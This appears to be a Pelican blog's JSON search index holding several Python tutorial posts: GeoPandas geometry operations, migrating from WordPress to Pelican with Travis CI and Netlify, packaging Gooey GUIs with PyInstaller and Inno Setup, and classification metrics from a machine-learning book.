[0.3, \"#f1b6da\"], [0.4, \"#fde0ef\"], [0.5, \"#f7f7f7\"], [0.6, \"#e6f5d0\"], [0.7, \"#b8e186\"], [0.8, \"#7fbc41\"], [0.9, \"#4d9221\"], [1, \"#276419\"]], \"sequential\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"sequentialminus\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]]}, \"colorway\": [\"#636efa\", \"#EF553B\", \"#00cc96\", \"#ab63fa\", \"#FFA15A\", \"#19d3f3\", \"#FF6692\", \"#B6E880\", \"#FF97FF\", \"#FECB52\"], \"font\": {\"color\": \"#2a3f5f\"}, \"geo\": {\"bgcolor\": \"white\", \"lakecolor\": \"white\", \"landcolor\": \"#E5ECF6\", \"showlakes\": true, \"showland\": true, \"subunitcolor\": \"white\"}, \"hoverlabel\": {\"align\": \"left\"}, \"hovermode\": \"closest\", \"mapbox\": {\"style\": \"light\"}, \"paper_bgcolor\": \"white\", \"plot_bgcolor\": \"#E5ECF6\", \"polar\": {\"angularaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"radialaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"scene\": {\"xaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"yaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"zaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}}, \"shapedefaults\": {\"line\": {\"color\": \"#2a3f5f\"}}, \"ternary\": {\"aaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"baxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"caxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"title\": {\"x\": 0.05}, \"xaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}, \"yaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}}}, \"title\": {\"text\": \"Random 3D Terrain\"}}, {\"responsive\": true} ) };","tags":"Python","url":"https://jackmckew.dev/3d-terrain-in-python.html","loc":"https://jackmckew.dev/3d-terrain-in-python.html"},{"title":"Intro To GeoPandas","text":"Pandas for geospatial data Personally whenever I am faced with a problem that involves analysing geospatial data, GeoPandas is the first tool/package I reach for. Extending on the Pandas dataframe data structure, GeoPandas brings functionality for working with points, polygons and more out of the box. This post is to go through some basic geometry functions which I find myself countless times in GIS work. First Steps A Pandas dataframe , is essentially a tabular representation of a dataset; a GeoPandas dataframe is an extension on this tabular format that includes a 'geometry' column and a crs. The 'geometry' column is exactly as it sounds, it contains the geometry of the point, line or polygon that is assosciated with the rest of the columns (this is defined by the shapely module). The crs (Coordinate Reference System) attribute to a GeoPandas dataframe contains the projection of the data into the real world (eg, WGS84) Let's begin by creating some example geometries with Shapely to include in our GeoDataFrame. In [1]: import geopandas import pandas from shapely.geometry import Polygon , Point In [2]: p1 = Polygon ([( 0 , 0 ), ( 1 , 0 ), ( 1 , 1 ), ( 0 , 1 )]) p2 = Polygon ([( 0 , 0 ), ( 1 , 0 ), ( 1 , 1 )]) p3 = Polygon ([( 2 , 0 ), ( 3 , 0 ), ( 3 , 1 ), ( 2 , 1 )]) gdf = geopandas . GeoDataFrame ( columns = [ 'geometry' ], data = [ p1 , p2 , p3 ]) gdf [ 'Data' ] = { 0 : 0 , 1 : 1 , 2 : 2 } display ( gdf ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } geometry Data 0 POLYGON ((0.00000 0.00000, 1.00000 0.00000, 1.... 0 1 POLYGON ((0.00000 0.00000, 1.00000 0.00000, 1.... 1 2 POLYGON ((2.00000 0.00000, 3.00000 0.00000, 3.... 2 As we can see, our new polygons and their assosciated data is given in a tabular format and can be worked with like a Pandas DataFrame. For me personally, I find GIS work to be a very visual process and struggle to imagine the shapes without them in front of me, so let's plot them. Luckily for us this is a very simple process as there is already a plot function within GeoPandas. In [3]: plt = gdf . plot ( cmap = 'viridis' , edgecolor = 'black' , alpha = 0.8 ) *{stroke-linecap:butt;stroke-linejoin:round;} If you didn't notice from the polygon definition, we've created 2 squares (purple & yellow) and one triangle. Now what if we wanted to know the area of all of the shapes in our GeoDataFrame. Since we've initialised our data in a GeoDataFrame this can be done quite easily. I have noted two ways to do this, as per Martin Fleischmann 's help on Twitter , thank you Martin! In [4]: gdf [ 'Shape Area' ] = gdf . geometry . area # gdf['Shape Area'] = gdf.geometry.apply(lambda x: x.area) display ( gdf ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } geometry Data Shape Area 0 POLYGON ((0.00000 0.00000, 1.00000 0.00000, 1.... 0 1.0 1 POLYGON ((0.00000 0.00000, 1.00000 0.00000, 1.... 1 0.5 2 POLYGON ((2.00000 0.00000, 3.00000 0.00000, 3.... 2 1.0 EDIT: The apply method still technically works, but there is an already implemented area property of a GeoDataFrame that we can utilise, make it much nicer to read! To break down what's happening above, we are 'creating' a new column in our GeoDataFrame named 'Shape Area'. Following this, we are selecting the 'geometry' column (this can also be achieved with gdf ['geometry'] ) and using the apply function. The apply function works by iterating over each row invidually (in this case it's simply each value in the geometry column). After this we are creating an 'anonymous' function, meaning, it's a function that doesn't require a definition. For each value in our geometry column, since they are Shapely objects, we can access the area function within them. Finally you can see the areas are calculated and added as a new column. Overlapping Area Now let's use what we have just learned to find the area that is overlapping of two shapes. To create the shapes this time though, we are going to start with a point and use the buffer function to make this a polygon. Following this, we will give the DataFrame some data, initialise the GeoDataFrames, calculate the area and plot them on a single graph. In [5]: p1 = Point (( 1 , 2 )) . buffer ( 2 ) p2 = Point (( 2 , 2 )) . buffer ( 2 ) df_1 = pandas . DataFrame ({ 'a' : [ 11 ]}) df_2 = pandas . DataFrame ({ 'b' : [ 22 ]}) gdf_1 = geopandas . GeoDataFrame ( df_1 , geometry = [ p1 ]) gdf_2 = geopandas . GeoDataFrame ( df_2 , geometry = [ p2 ]) gdf_1 [ 'area' ] = gdf_1 . geometry . apply ( lambda x : x . area ) gdf_2 [ 'area' ] = gdf_2 . geometry . apply ( lambda x : x . area ) ax = gdf_1 . plot ( color = 'purple' , edgecolor = 'k' ) gdf_2 . plot ( ax = ax , color = 'yellow' , edgecolor = 'k' , alpha = 0.5 ) Out[5]: <matplotlib.axes._subplots.AxesSubplot at 0x1dd37e4a308> *{stroke-linecap:butt;stroke-linejoin:round;} Now it's time to make use of the overlay function within GeoPandas. There are many implemented methods within the overlay function which are outlined here: Set Operations with Overlay . We will be using the intersection method, which will only return the area of each geometry which overlaps. Notice below when we display the GeoPandas GeoDataFrame and plot the result that we have only returned the overlapping area, with data brought from both underlying geometries (a and b) column. In [6]: overlay = geopandas . overlay ( gdf_1 , gdf_2 , how = 'intersection' ) overlay . plot ( cmap = 'viridis' , edgecolor = 'k' ) display ( overlay ) # total_gdf = geopandas.GeoDataFrame(pandas.concat([gdf_1,gdf_2,overlay],ignore_index=True,sort=False)) # display(total_gdf) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a area_1 b area_2 geometry 0 11 12.546194 22 12.546194 POLYGON ((3.00000 2.00000, 2.99037 1.80397, 2.... *{stroke-linecap:butt;stroke-linejoin:round;} Now we can reuse our methodology from before to recalculate the area that is overlapping. In [7]: overlay [ 'Overlapping Area' ] = overlay . geometry . area # overlay['Overlapping Area'] = overlay.geometry.apply(lambda x: x.area) display ( overlay ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a area_1 b area_2 geometry Overlapping Area 0 11 12.546194 22 12.546194 POLYGON ((3.00000 2.00000, 2.99037 1.80397, 2.... 8.591554 Distance to Nearest Point from Polygon Another common type of analysis that we would like to make, is how far a particular polygon may be from a point. In [8]: p1 = Point (( 1 , 2 )) . buffer ( 2 ) p2 = Point (( 4 , 3 )) p3 = Point (( 5 , - 1 )) df_1 = pandas . DataFrame ({ 'a' : [ 11 ]}) df_2 = pandas . DataFrame ({ 'b' : [ 22 , 33 ]}) gdf_1 = geopandas . GeoDataFrame ( df_1 , geometry = [ p1 ]) gdf_2 = geopandas . GeoDataFrame ( df_2 , geometry = [ p2 , p3 ]) ax = gdf_1 . plot ( color = 'purple' , edgecolor = 'k' ) gdf_2 . plot ( ax = ax , color = 'yellow' , edgecolor = 'k' , alpha = 0.5 ) Out[8]: <matplotlib.axes._subplots.AxesSubplot at 0x1dd37f437c8> *{stroke-linecap:butt;stroke-linejoin:round;} I have noted two ways to do this, as per Martin Fleischmann 's help on Twitter , thank you Martin! In [9]: # gdf_2.geometry.apply(lambda x: gdf_1.distance(x)) gdf_2 . distance ( p1 ) Out[9]: 0 1.163931 1 3.002337 dtype: float64 This will calculate the distance at each point to our polygon, from this we can select the minimum value. In [10]: gdf_2 . distance ( p1 ) . min () # gdf_2.geometry.apply(lambda x: gdf_1.distance(x)).min() Out[10]: 1.163931136530937 EDIT: This is now not required :) Notice that this returns a GeoSeries, so we have to select the first element (Zeroth in Python). In [11]: # gdf_2.geometry.apply(lambda x: gdf_1.distance(x)).min()[0] Count of Points in Polygon The final application in this point will be to count the amount of points within a polygon. In [12]: p1 = Point (( 1 , 1 )) . buffer ( 5 ) p2 = Point (( 6 , 9 )) . buffer ( 1.5 ) p3 = Point (( 2 , 2 )) p4 = Point (( 4 , 3 )) p5 = Point (( 6 , 8 )) df_1 = pandas . DataFrame ({ 'a' : [ 11 , 22 ]}) df_2 = pandas . DataFrame ({ 'b' : [ 33 , 44 , 55 ]}) gdf_1 = geopandas . GeoDataFrame ( df_1 , geometry = [ p1 , p2 ]) gdf_2 = geopandas . GeoDataFrame ( df_2 , geometry = [ p3 , p4 , p5 ]) ax = gdf_1 . plot ( color = 'purple' , edgecolor = 'k' ) gdf_2 . plot ( ax = ax , color = 'yellow' , edgecolor = 'k' , alpha = 0.5 ) Out[12]: <matplotlib.axes._subplots.AxesSubplot at 0x1dd37fc1c48> *{stroke-linecap:butt;stroke-linejoin:round;} We are looking to have our answer be 2 for the larger polygon and 1 for the smaller circle. To make sure we are getting the right answers, let's provide an identifying column for each polygon. This is completed by using the apply function again, row wise (axis=1) and by concatenating the word 'Polygon' with the row number (this is called name in Pandas). In [13]: gdf_1 [ 'id' ] = gdf_1 . apply ( lambda x : 'Polygon ' + str ( x . name ), axis = 1 ) display ( gdf_1 ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a geometry id 0 11 POLYGON ((6.00000 1.00000, 5.97592 0.50991, 5.... Polygon 0 1 22 POLYGON ((7.50000 9.00000, 7.49278 8.85297, 7.... Polygon 1 Now we are going to use a spatial join function, like the overlay previously, this also has many methods within it. They are all detailed here: Merging Data in GeoPandas . For this application we will use the within operator. In [14]: spatial_join = geopandas . sjoin ( gdf_2 , gdf_1 , op = 'within' ) display ( spatial_join ) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } b geometry index_right a id 0 33 POINT (2.00000 2.00000) 0 11 Polygon 0 1 44 POINT (4.00000 3.00000) 0 11 Polygon 0 2 55 POINT (6.00000 8.00000) 1 22 Polygon 1 As we can see above, the output GeoDataFrame from this is all of our points and the id containing the Polygon they live in. Next we will group them by id, count how many of them there is (with .size()) and create a new DataFrame with the results of our analysis. In [15]: grouped = spatial_join . groupby ( 'id' ) . size () display ( grouped ) df = grouped . to_frame () . reset_index () df . columns = [ 'id' , 'Count' ] display ( df ) id Polygon 0 2 Polygon 1 1 dtype: int64 .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } id Count 0 Polygon 0 2 1 Polygon 1 1 To bring this back into our original GeoDataFrame, this is acheieved with the merge function. In [16]: gdf_1 . merge ( df , on = 'id' , how = 'outer' ) Out[16]: .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } a geometry id Count 0 11 POLYGON ((6.00000 1.00000, 5.97592 0.50991, 5.... Polygon 0 2 1 22 POLYGON ((7.50000 9.00000, 7.49278 8.85297, 7.... Polygon 1 1","tags":"Python","url":"https://jackmckew.dev/intro-to-geopandas.html","loc":"https://jackmckew.dev/intro-to-geopandas.html"},{"title":"Migrating from Wordpress to Pelican","text":"For some time now I have been wanting to move away from Wordpress, due to my specific case of wanting to embed custom HTML and JavaScript code snippets to enable interactive data visualisation. Furthermore my previous workflow of posts was disjointed in which I would develop the code in a Jupyter notebook, sometimes even writing the post in markdown within the notebook, then copying all of this out of the notebook into a Wordpress post and fiddling around with formatting for much too long. What tipped me over the edge was when I was looking back on previous posts (as this blog is mainly for storing previous projects, concepts and ideas), I was finding that I would go through the post and then have no idea whatsoever on where the project actually lived, this had to be fixed. I started noticing more and more people online had moved to Github Pages , which is primarily used with Jekyll. This rabbit hole went on as follows: Static served websites (generate HTML pages and serve them) Numerous static site generators: Jekyll, Hugo, VuePress Pelican So on Blogging with Jupyter notebooks Concept of CI/CD Travis CI Netlify What I settled on was a bit of a concoction of services, such that I can both get my feet wet with these new tools and still stay in the land of snakes (Python). Pelican + Travis CI + Netlify + Github Before we get into all 4 services in conjunction, let's separate and step through the process for each of them. Pelican Right off the bat, the first milestone I wanted to hit was to be able to generate a locally hosted static site from a single post converted to markdown. Luckily, there is an exact guide for going through this process in the documentation for Pelican and using the tool pelican-quickstart. http://docs.getpelican.com/en/3.6.3/quickstart.html Themes The next step was to decide on a theme for the website, while the intentions were to develop a theme from scratch, I shall leave this for a later date. An easy way of previewing themes was the website: http://www.pelicanthemes.com/ Which lets you scroll through the various themes, and even links to the repository on github for the theme if you wish to use it. The theme I decided on was Flex by Alexandre Vicenzi . Apply the the theme was as simple as cloning the repo (or using git submodules ), and adding one line of code in pelicanconf.py (generated automatically by pelican-quickstart). 1 THEME = \"./themes/Flex\" Plugins Admittedly, I just tried out all the plugins in the Pelican Plugins Repository until I found the combination that works for me, this ended up being: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 PLUGINS = [ \"sitemap\" , \"better_codeblock_line_numbering\" , \"better_code_samples\" , \"bootstrapify\" , \"deadlinks\" , \"more_categories\" , \"neighbors\" , \"pelican-ert\" , \"liquid_tags.notebook\" , \"liquid_tags.include_code\" , \"representative_image\" , \"share_post\" , 'show_source' , 'tipue_search' , \"dateish\" , \"post_stats\" , \"render_math\" , \"autostatic\" , \"clean_summary\" ] For tipue_search in particular, as this wasn't supported by the theme yet, I created a pull request on the original repository, with the functionality integrated https://github.com/alexandrevicenzi/Flex/pull/193 . Wordpress Import Now that I had the skeleton of the website set up, I needed to bring in all the existing posts from wordpress. By following another guide within the Pelican documentation, this was a relatively simple task http://docs.getpelican.com/en/3.6.3/importer.html . However, I did spend the time to go through and edit each markdown to remove redundant 'wordpress' formatting tags manually. Linking to Content As one of the main tasks of this project was to consolidate articles with the content/code/analysis in one spot, initially in development following the guide in http://docs.getpelican.com/en/3.6.3/content.html . 1 2 3 4 5 6 7 8 9 content â”œâ”€â”€ articles â”‚ â””â”€â”€ article.md â”œâ”€â”€ images â”‚ â””â”€â”€ han.jpg â”œâ”€â”€ pdfs â”‚ â””â”€â”€ menu.pdf â””â”€â”€ pages â””â”€â”€ test.md I ended up with a structure like above, which annoyed me a bit as now the content was in one place, but still divided into 3 folders with little-to-no link between them, my goal was to have the structure like: 1 2 3 4 5 6 7 8 9 10 11 content â”œâ”€â”€ articles â”‚ â”œâ”€â”€ test-article â”‚ | â”œâ”€â”€ img â”‚ â”‚ | â””â”€â”€ icon.png â”‚ â”‚ | â””â”€â”€ photo.jpg â”‚ | â”œâ”€â”€ notebooks â”‚ â”‚ | â””â”€â”€ test-notebook.ipynb â”‚ â”‚ â””â”€â”€ article.md â””â”€â”€ files â””â”€â”€ archive.zip By using the plugins autostatic & liquid_tags , I was able to achieve this structure. Travis CI To be honest, I was actually surprised at how easy it was to turn Travis CI and that I could spin up a virtual machine, install all the dependencies and re-build the website. However, I had a lot of trouble trying to get Travis CI to push back to the repository such that Netlify could build from it. This was later remedied by setting a repository secret variable on Travis CI as I couldn't get the secret token encrypted by Travis CI CLI (Ruby application). In essence, all that was needed was a .travis.yml file in the root directory which ended up like this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 language: python branches: only: - master install: - pip install --upgrade pip - pip install -r requirements.txt script: - pelican content deploy: provider: pages skip_cleanup: true github_token: $GITHUB_TOKEN keep_history: true local_dir: output on: branch: master Netlify Admittedly, I feel as if I'm not using Netlify for all it can do. Essentially, all for this project, it just detects a change in the gh-pages branch (for Github Pages), and redeploys the website out to a custom domain. Github Github is the repository location for all the code, and I use Git for version control and interaction with the repository. All I need to do now to create a new post is: Push a new markdown file (and any other linked content) to the master branch of the repository, This will fire up Travis CI to build the site with Pelican for me, Travis CI will then push the created site to the gh-pages branch of the repository, Netlify will detect the change and process the new site, The new site is deployed with updated posts!","tags":"Software Development","url":"https://jackmckew.dev/migrating-from-wordpress-to-pelican.html","loc":"https://jackmckew.dev/migrating-from-wordpress-to-pelican.html"},{"title":"Making Executables Installable with Inno Setup","text":"Following on from last week's post on making executable GUIs with Gooey, this post will cover how to make the executables we have packaged up into installable files so our users can run them easily. Once we have created the executable file for our GUI (which will be located in the dist folder: Now we are going to use a program called Inno Setup, which can be downloaded from: http://www.jrsoftware.org/isinfo.php. After you've installed Inno Setup, run these commands: Select create a new script file using the Script Wizard Fill in the application information Leave defaults Select the *.exe file found in the dist folder Select shortcut choices Add any license or information files Select install mode Select the languages Provide compiler settings and icon for installable Leave default Compile new script Share around the executable installer! Once installed, it will now act and behave like any other software installed on your computer!","tags":"Software Development","url":"https://jackmckew.dev/making-executables-installable-with-inno-setup.html","loc":"https://jackmckew.dev/making-executables-installable-with-inno-setup.html"},{"title":"Making Executable GUIs with Python, Gooey & Pyinstaller","text":"Today we will go through how to go from a python script to packaged executable with a guided user interface (GUI) for users. First off we still start by writing the scripts that we would like to share with others to be able to use, especially for users that may be uncomfortable in a programming environment and would feel at home with a GUI. My personal favourite part about Gooey , is that you are essentially creating a command line interface (CLI) tool, which Gooey then uses to generate a GUI. This eliminates having two separate code bases to facilitate CLI & GUI users, which can be very painful at times. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 def print_file_name ( path , filesize ): \"\"\" Inputs: path (str): filepath to file selected filezize (bool): whether to print the file size or not Prints file name of file from path given and if filesize is true then will print the total size of the file in bytes \"\"\" print ( os . path . basename ( path )) if filesize : print ( f \"File size: { os . path . getsize ( path ) } bytes\" ) def get_files_in_folder ( path , extension ): \"\"\" Inputs: path (str): path to folder selected extension (str): extension to filter by Prints all files in folder, if an extension is given, will only print the files with the given extension \"\"\" f = [] for ( dirpath , dirnames , filenames ) in os . walk ( path ): if extension : for filename in filenames : if filename . endswith ( extension ): f . append ( filename ) else : f . extend ( filenames ) return f The 2 functions defined above are for getting information of selected files, or returning a list of files found within a folder (and subfolders). Now to use Gooey , we need to define a 'main' function for parsing the arguments for the GUI to generate controls. As Gooey is based on the argparse library, if you have previously built CLI tools with argparse, the migration to Gooey is quite simplistic. However as there is always edge cases, ensure to check your tools functionality once you have developed it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 @Gooey ( optional_cols = 2 , program_name = \"Gooey Executable with Pyinstaller\" ) def parse_args (): prog_descrip = 'Pyinstaller example with Gooey' parser = GooeyParser ( description = prog_descrip ) sub_parsers = parser . add_subparsers ( help = 'commands' , dest = 'command' ) first_parser = sub_parsers . add_parser ( 'file' , help = 'This function prints the chosen file name' ) first_parser . add_argument ( 'file_path' , help = 'Select a random file' , type = str , widget = 'FileChooser' ) first_parser . add_argument ( '--file-size' , help = 'Do you want to print the file size?' , action = 'store_true' ) second_parser = sub_parsers . add_parser ( 'folder' , help = 'This funtion prints all files in a folder' ) second_parser . add_argument ( 'folder_path' , help = 'Select a folder' , type = str , widget = 'DirChooser' ) second_parser . add_argument ( '--file-type' , help = 'Specify file type with .jpg' , type = str ) args = parser . parse_args () return args By using the Gooey decorator we are able to define many different layout options for our GUI. Since we are trying to enable users to use multiple scripts which are different and separate, I personally like to the optional columns layout, but there are many other types of layouts which can be seen here: https://github.com/chriskiehl/Gooey#layout-customization . Following this we create our argument parsing function, and in which we define parsers, subparsers and add the arguments. This post will not be covering how to write CLIs, but it is on the list for future posts. To complete the script, we need to put in the functionality at startup. 1 2 3 4 5 6 if __name__ == '__main__' : conf = parse_args () if conf . command == 'file' : print_file_name ( conf . file_path , conf . file_size ) elif conf . command == 'folder' : print ( get_files_in_folder ( conf . folder_path , conf . file_type )) By embedding the command names within the arguments we are able to use a variety of functions which may or may not be interconnected. Once this file is run will generate the following: Which are fully embedded within the windows file explorer system for selecting files, folders, etc. Now to package this GUI as an executable, we use PyInstaller . By following Chris Kiehl's (Developer of Gooey) instructions on using Pyinstaller and Gooey: https://chriskiehl.com/article/packaging-gooey-with-pyinstaller . All we need to is create a build.spec file within our directory and run pyinstaller build.spec. This will then generate a build folder and a dist folder within your current directory. The build folder will contain all the files used in generating the executable, which is found within the dist folder. The code in it's entirety is: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from gooey import Gooey , GooeyParser import os @Gooey ( optional_cols = 2 , program_name = \"Gooey Executable with Pyinstaller\" ) def parse_args (): prog_descrip = 'Pyinstaller example with Gooey' parser = GooeyParser ( description = prog_descrip ) sub_parsers = parser . add_subparsers ( help = 'commands' , dest = 'command' ) first_parser = sub_parsers . add_parser ( 'file' , help = 'This function prints the chosen file name' ) first_parser . add_argument ( 'file_path' , help = 'Select a random file' , type = str , widget = 'FileChooser' ) first_parser . add_argument ( '--file-size' , help = 'Do you want to print the file size?' , action = 'store_true' ) second_parser = sub_parsers . add_parser ( 'folder' , help = 'This funtion prints all files in a folder' ) second_parser . add_argument ( 'folder_path' , help = 'Select a folder' , type = str , widget = 'DirChooser' ) second_parser . add_argument ( '--file-type' , help = 'Specify file type with .jpg' , type = str ) args = parser . parse_args () return args def print_file_name ( path , filesize ): \"\"\" Inputs: path (str): filepath to file selected filezize (bool): whether to print the file size or not Prints file name of file from path given and if filesize is true then will print the total size of the file in bytes \"\"\" print ( os . path . basename ( path )) if filesize : print ( f \"File size: { os . path . getsize ( path ) } bytes\" ) def get_files_in_folder ( path , extension ): \"\"\" Inputs: path (str): path to folder selected extension (str): extension to filter by Prints all files in folder, if an extension is given, will only print the files with the given extension \"\"\" f = [] for ( dirpath , dirnames , filenames ) in os . walk ( path ): if extension : for filename in filenames : if filename . endswith ( extension ): f . append ( filename ) else : f . extend ( filenames ) return f if __name__ == '__main__' : conf = parse_args () if conf . command == 'file' : print_file_name ( conf . file_path , conf . file_size ) elif conf . command == 'folder' : print ( get_files_in_folder ( conf . folder_path , conf . file_type )) If you run into an error on Windows with the alert \"Failed to execute script pyi_rth_pkgres\", install the dev version of pyinstaller pip install https://github.com/pyinstaller/pyinstaller/archive/develop.zip This was noted in this issue on github: https://github.com/pyinstaller/pyinstaller/issues/2137","tags":"Python","url":"https://jackmckew.dev/making-executable-guis-with-python-gooey-pyinstaller.html","loc":"https://jackmckew.dev/making-executable-guis-with-python-gooey-pyinstaller.html"},{"title":"Hands On Machine Learning Chapter 3","text":"Chapter 3 is focusing in on classification systems. As brought up earlier, most common supervised machine learning tasks are regression (predicting values) and classification (predicting classes). This chapter goes through the 'Hello World' of classification tasks, the MNIST dataset. The MNIST dataset is a set of 70,000 images of handwritten digits written by high school students and employees of the US Census Bureau. Thankfully each image is also labelled with the digit it represents. Chapter 3 also introduces one of my personal favourite ways of evaluating classification performance, a confusion matrix. A confusion matrix is built up of rows and columns, rows representing the actual classification and columns representing the predicted classification . In a perfect classifier, the diagonal from left to right will be full of numbers ( true positives (TP) and true negatives (TN) and every where else will be 0. Whenever there is a number to the upper right of the diagonal, this represents any false positives (FP), while the lower left of the diagonal, representing false negatives (FN). Another way to assess the performance is to use the accuracy of the positive predicts, called the precision of the classifier. $$ \\frac{TP}{TP + FP} $$ Another metric that goes hand-in-hand with precision is the recall of a classifier. Which is the ratio of true positives that are correctly classified. $$ \\frac{TP}{TP+FN} $$ Or you can combine both precision and recall into a single metric, namely the F1 score . The F1 score is the harmonic mean of precision and recall. The harmonic mean gives much more weight to the low values, meaning the F1 score will only be high if the recall and precision are high. $$ \\frac{TP}{TP+\\frac{FN+FP}{2}} $$ Precision/Recall Tradeoff As above, when comparing precision and recall, you cannot have 100% of either, instead it is a trade off. With a precision of 100%, means all the samples classified as positive are true positives, however there may be a lot more that are now false positives. With a recall of 100%, all samples classified will include all of the true positives, however now all the false positives are included. Deciding the trade off comes down to the application. For example, if you wanted to create a classifier that detects websites that are safe for kids, you would prefer a classifier that rejects many good websites (low recall), but keeps only safe ones (high precision). On the other hand, if you wanted to create a classifier that detects threats in messages, it is probably fine to have a 25% precision, as long as it has 99% recall; meaning the authorities will get a few false alerts, but almost all threats will be identified. if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) { var align = \"center\", indent = \"0em\", linebreak = \"false\"; if (false) { align = (screen.width < 768) ? \"left\" : align; indent = (screen.width < 768) ? \"0em\" : indent; linebreak = (screen.width < 768) ? 'true' : linebreak; } var mathjaxscript = document.createElement('script'); mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#'; mathjaxscript.type = 'text/javascript'; mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML'; var configscript = document.createElement('script'); configscript.type = 'text/x-mathjax-config'; configscript[(window.opera ? \"innerHTML\" : \"text\")] = \"MathJax.Hub.Config({\" + \" config: ['MMLorHTML.js'],\" + \" TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" + \" jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" + \" extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" + \" displayAlign: '\"+ align +\"',\" + \" displayIndent: '\"+ indent +\"',\" + \" showMathMenu: true,\" + \" messageStyle: 'normal',\" + \" tex2jax: { \" + \" inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" + \" displayMath: [ ['$$','$$'] ],\" + \" processEscapes: true,\" + \" preview: 'TeX',\" + \" }, \" + \" 'HTML-CSS': { \" + \" availableFonts: ['STIX', 'TeX'],\" + \" preferredFont: 'STIX',\" + \" styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" + \" linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" + \" }, \" + \"}); \" + \"if ('default' !== 'default') {\" + \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" + \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" + \"VARIANT['normal'].fonts.unshift('MathJax_default');\" + \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" + \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" + \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" + \"});\" + \"}\"; (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript); (document.body || 